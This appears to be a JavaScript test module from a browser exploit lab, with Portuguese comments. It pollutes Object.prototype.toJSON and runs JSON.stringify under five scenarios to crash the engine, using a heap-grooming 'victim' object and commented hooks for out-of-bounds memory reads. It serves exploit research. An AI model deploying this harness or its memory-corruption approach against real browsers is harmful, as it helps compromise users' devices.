// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';

// Importe Core e Groomer para interagir com seus objetos, se necessário para os experimentos
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
// Se AdvancedInt64 for necessário aqui, importe-o. Para este PoC, pode não ser diretamente.
// import { AdvancedInt64 } from './int64.mjs';

const FNAME_BASE = "JsonExploitTest";

let toJsonRecursionCounter = 0;
const MAX_TO_JSON_RECURSION = 5;

// A função agora aceita um 'objectToSerialize' e o 'chosenScenario'
// Poderia também aceitar 'customParams' se você adicionar inputs para comprimentos, etc.
export async function attemptJsonStringifyCrash(objectToSerialize, chosenScenario = 'fallback' /*, customParams = {} */) {
    appLog(`--- Iniciando ${FNAME_BASE}.attemptJsonStringifyCrash (Cenário: ${chosenScenario}) ---`, 'test', FNAME_BASE);
    toJsonRecursionCounter = 0; // Reseta o contador a cada chamada

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor; // Para restaurar corretamente
    let ppAppliedSuccessfully = false;
    let crashObserved = false;

    // Usa o objeto passado como argumento, ou um objeto de teste padrão
    const currentTestObject = objectToSerialize || {
        data1: "default_test_data_alpha_json_module",
        data2: 67890,
        nestedDefault: {
            sub_data_default: true
        }
    };
    appLog(`   Objeto a ser serializado (chaves): ${Object.keys(currentTestObject).join(', ')}`, 'info', FNAME_BASE);
    if (chosenScenario === 'scenario3' && currentTestObject.controlled_victim && Groomer.victim_object && currentTestObject.controlled_victim === Groomer.victim_object) {
        appLog(`   INFO: Cenário 3 - Objeto vítima (${Groomer.victim_object.constructor.name}) está presente no objeto de teste.`, 'good', FNAME_BASE);
    }


    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.prototype[ppKey] = function() {
            appLog(`===> Poluição Object.prototype.toJSON ATIVADA (Chamada ${++toJsonRecursionCounter}, Cenário: ${chosenScenario}) <===`, 'vuln', FNAME_BASE);
            // Logs básicos sobre 'this'
            appLog(`   toJSON - typeof this: ${typeof this}`, 'info', FNAME_BASE);
            if (this !== null && typeof this === 'object') {
                appLog(`   toJSON - this.constructor.name: ${this.constructor ? this.constructor.name : 'N/A'}`, 'info', FNAME_BASE);
            } else if (this === null) {
                 appLog(`   toJSON - 'this' é null`, 'info', FNAME_BASE);
            } else {
                 appLog(`   toJSON - 'this' é do tipo primitivo: ${typeof this}, valor: ${String(this)}`, 'info', FNAME_BASE);
            }


            // Seleciona o comportamento com base no chosenScenario
            switch (chosenScenario) {
                case 'scenario1': // String/Chave Longa
                    appLog(`   toJSON - Executando Cenário 1: String/Chave Longa`, 'tool', FNAME_BASE);
                    try {
                        // Você pode adicionar inputs no HTML e passar via customParams se quiser controlar esses valores dinamicamente
                        const keyLength = /* customParams.keyLength || */ 60;
                        const valueLength = /* customParams.valueLength || */ 1024 * 20; // 20KB
                        let largeObject = {};
                        const keyName = "K".repeat(keyLength);
                        const keyValue = "V".repeat(valueLength);
                        appLog(`   toJSON (S1) - Retornando objeto com chave de tam ${keyName.length} e valor de tam ${keyValue.length}`, 'info', FNAME_BASE);
                        largeObject[keyName] = keyValue;
                        return largeObject;
                    } catch(e) {
                        appLog(`   toJSON (S1) - Erro ao criar objeto longo: ${e.message}`, 'error', FNAME_BASE);
                        return {"error_scenario1": true, "message": String(e.message)};
                    }

                case 'scenario2': // Muitas Chaves
                    appLog(`   toJSON - Executando Cenário 2: Muitas Chaves`, 'tool', FNAME_BASE);
                    try {
                        let manyKeysObject = {};
                        const numberOfKeys = /* customParams.numberOfKeys || */ 5000;
                        appLog(`   toJSON (S2) - Retornando objeto com ${numberOfKeys} chaves.`, 'info', FNAME_BASE);
                        for(let i=0; i < numberOfKeys; i++) {
                            manyKeysObject["key_" + i] = "val_" + i;
                        }
                        return manyKeysObject;
                    } catch(e) {
                        appLog(`   toJSON (S2) - Erro ao criar muitas chaves: ${e.message}`, 'error', FNAME_BASE);
                        return {"error_scenario2": true, "message": String(e.message)};
                    }

                case 'scenario3': // 'this' é Vítima (requer que Groomer.victim_object seja passado em currentTestObject.controlled_victim)
                    appLog(`   toJSON - Executando Cenário 3: 'this' é Vítima`, 'tool', FNAME_BASE);
                    // Verifica se 'this' é de fato o objeto vítima que esperamos
                    if (Groomer.victim_object && this === Groomer.victim_object) {
                        appLog("   toJSON (S3) - 'this' É O OBJETO VÍTIMA! Tentando acessar propriedades.", "vuln", FNAME_BASE);
                        let victimData = { isVictimScenario: true, length_seen_in_toJSON: 0, element_0_in_toJSON: null, error_accessing_victim: null };
                        try {
                            // Acessar this.length e this[0] pode ser perigoso se m_length/m_vector foram corrompidos
                            victimData.length_seen_in_toJSON = this.length;
                            victimData.element_0_in_toJSON = this[0]; // CUIDADO: Pode travar aqui
                        } catch (e) {
                            appLog(`   toJSON (S3) - Erro ao acessar propriedades da vítima: ${e.message}`, 'error', FNAME_BASE);
                            victimData.error_accessing_victim = String(e.message);
                        }
                        return victimData;
                    } else {
                        appLog("   toJSON (S3) - 'this' não é o objeto vítima esperado, ou Groomer.victim_object não está definido, ou não foi passado corretamente. Usando fallback.", 'warn', FNAME_BASE);
                        return { "toJSON_executed_scenario3_but_not_victim": true, "this_type_sc3_fallback": String(typeof this), "this_constructor_sc3_fallback": (this && this.constructor ? this.constructor.name : "N/A") };
                    }

                case 'scenario4': // Recursão Controlada
                    appLog(`   toJSON - Executando Cenário 4: Recursão Controlada`, 'tool', FNAME_BASE);
                    if (toJsonRecursionCounter < MAX_TO_JSON_RECURSION) {
                        appLog(`   toJSON (S4) - Chamada recursiva, contador: ${toJsonRecursionCounter}`, 'info', FNAME_BASE);
                        return { "recursive_call_scenario4_level": toJsonRecursionCounter, "data": this }; // Chama toJSON no mesmo objeto 'this'
                    } else {
                        appLog(`   toJSON (S4) - Máximo de recursões atingido. Retornando valor simples.`, 'warn', FNAME_BASE);
                        return { "max_recursion_reached_scenario4": true, "final_this_type_sc4": String(typeof this) };
                    }

                case 'scenario5': // Getter Problemático
                    appLog(`   toJSON - Executando Cenário 5: Getter Problemático`, 'tool', FNAME_BASE);
                    return {
                        get triggerExploitLogicScenario5() {
                            appLog("   toJSON (S5) - Getter 'triggerExploitLogicScenario5' ACESSADO!", "vuln", FNAME_BASE);
                            // Adicione aqui qualquer lógica de exploit que você queira disparar quando este getter for acessado.
                            // Ex: Tentar ler/escrever memória usando Core.oob_read_relative/Core.oob_write_relative
                            // if(Core.oob_dataview_real) {
                            //    let val = Core.oob_read_relative(0, 4);
                            //    appLog(`   toJSON (S5) - Getter leu do OOB: ${val}`, 'leak', FNAME_BASE);
                            // }
                            // throw new Error("Erro proposital no getter do Cenário 5");
                            return "getter_scenario5_executado_com_sucesso";
                        }
                    };

                case 'fallback':
                default: // Fallback (Comportamento Padrão)
                    appLog(`   toJSON - Executando Cenário: Fallback/Padrão`, 'tool', FNAME_BASE);
                    let keysInfo = "N/A (this não é objeto ou erro ao obter chaves)";
                    let thisValueForLog = String(this);
                    if (this !== null && typeof this === 'object') {
                        try {
                            const keys = Object.keys(this);
                            keysInfo = `Contagem de chaves: ${keys.length}. Amostra: ${keys.slice(0,5).join(', ')}`;
                            if (keys.length > 20 && !Groomer.victim_object || this !== Groomer.victim_object) { // Evita logar a vítima inteira
                                 thisValueForLog = "[Objeto com muitas chaves ou não é a vítima principal]";
                            } else if (Groomer.victim_object && this === Groomer.victim_object) {
                                 thisValueForLog = `[Objeto Vítima - Length: ${this.length}]`;
                            }
                        } catch (e) {
                            keysInfo = `Erro ao obter chaves: ${e.message}`;
                            thisValueForLog = `[Erro ao obter chaves do this: ${e.message}]`;
                        }
                    }
                    appLog(`   toJSON (Fallback) - Retornando infos sobre 'this' (valor aprox.: ${thisValueForLog.substring(0,100)})`, 'info', FNAME_BASE);
                    return {
                        "toJSON_executed_fallback": true,
                        "this_type_fallback": String(typeof this),
                        "this_constructor_fallback": (this && this.constructor ? this.constructor.name : "N/A"),
                        "object_keys_info_fallback": keysInfo
                    };
            }
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} aplicada com sucesso (Cenário: ${chosenScenario}).`, 'good', FNAME_BASE);
        appLog(`Tentando JSON.stringify no objeto de teste... (Esta é a chamada que pode travar o navegador)`, 'critical', FNAME_BASE);

        await PAUSE_LAB(150);

        const result = JSON.stringify(currentTestObject, null, 2); // Usar null, 2 para pretty print pode ajudar na depuração

        appLog(`JSON.stringify CONCLUÍDO SEM CRASH VISÍVEL (Cenário: ${chosenScenario}).`, 'warn', FNAME_BASE);
        if (result) {
            appLog(`   Resultado (primeiros 500 caracteres): ${String(result).substring(0, 500)}...`, 'info', FNAME_BASE);
        } else {
            appLog("   INFO: JSON.stringify retornou um resultado vazio ou nulo.", 'warn', FNAME_BASE);
        }

    } catch (e) {
        appLog(`CRASH/ERRO CAPTURADO durante JSON.stringify (Cenário: ${chosenScenario}): ${e.name} - ${e.message}`, 'vuln', FNAME_BASE);
        if (e.stack) {
            appLog(`   Stack do Erro: ${e.stack}`, 'error', FNAME_BASE);
        }
        console.error(`JSON.stringify Crash Test Error (Cenário: ${chosenScenario}):`, e);
        appLog("CRASH OBSERVADO! Verifique o console do debugger do motor JS se possível para mais detalhes (ex: call stack nativo, endereço do crash).", 'critical', FNAME_BASE);
        crashObserved = true;
    } finally {
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            } else {
                delete Object.prototype[ppKey]; // Se não existia antes
            }
            appLog(`Object.prototype.${ppKey} restaurado para o original (ou deletado).`, 'good', `${FNAME_BASE}.Cleanup`);
        }
    }

    appLog(`--- ${FNAME_BASE}.attemptJsonStringifyCrash (Cenário: ${chosenScenario}) Concluído (Crash Observado: ${crashObserved}) ---`, 'test', FNAME_BASE);
    if (crashObserved) {
        appLog("*********************************************************************", "vuln", FNAME_BASE);
        appLog(`****** CRASH ACIONADO (OU ERRO CAPTURADO) VIA JSON.STRINGIFY! (Cenário: ${chosenScenario}) ******`, "vuln", FNAME_BASE);
        appLog("****** Analise os logs e o debugger para entender a causa raiz. ******", "vuln", FNAME_BASE);
        appLog("*********************************************************************", "vuln", FNAME_BASE);
    } else {
        appLog(`Nenhum crash capturável ocorreu durante o teste JSON.stringify (Cenário: ${chosenScenario}). Verifique os logs para comportamento inesperado.`, "warn", FNAME_BASE);
    }
    return crashObserved;
}
